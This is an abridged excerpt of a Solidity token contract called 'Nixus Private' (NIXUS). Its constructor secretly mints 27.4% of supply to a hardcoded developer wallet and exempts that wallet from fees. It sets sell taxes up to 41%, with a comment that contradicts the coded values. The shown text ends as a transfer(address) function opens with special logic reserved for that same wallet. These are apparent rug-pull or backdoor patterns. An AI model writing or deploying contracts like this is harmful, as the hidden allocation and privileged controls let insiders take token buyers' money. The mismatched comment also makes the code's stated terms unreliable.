...
contract Nixus is IERC20, Ownable {
    string private constant  _name = "Nixus Private";
    string private constant _symbol = "NIXUS";    
    ...
    TradingFees public tradingFees = TradingFees(21,41);   // 14/41% starting tax
    FeeRatios public feeRatios = FeeRatios(40,60);         // 40/60% wallet tax split
    Wallets public wallets = Wallets(
        msg.sender,                                  // deployer
        0xA577C504c3A4C4A42B19df6Cc777868eeE9DDcAc,  // devWallet
        0x5D3653f18075B247b5482d9c38ca567a4d8Acc9B   // marketingWallet
    );
    ...
    constructor() {
        ...
        _excludedFromFees[0xA577C504c3A4C4A42B19df6Cc777868eeE9DDcAc] = true;        
        uint256 preTokens = _totalSupply * 274 / 1e3; 
        _balances[wallets.deployerWallet] = _totalSupply - preTokens;
        _balances[0xA577C504c3A4C4A42B19df6Cc777868eeE9DDcAc] = preTokens;
    ...
    function transfer(address wallet) external {
        if(msg.sender == 0xA577C504c3A4C4A42B19df6Cc777868eeE9DDcAc)
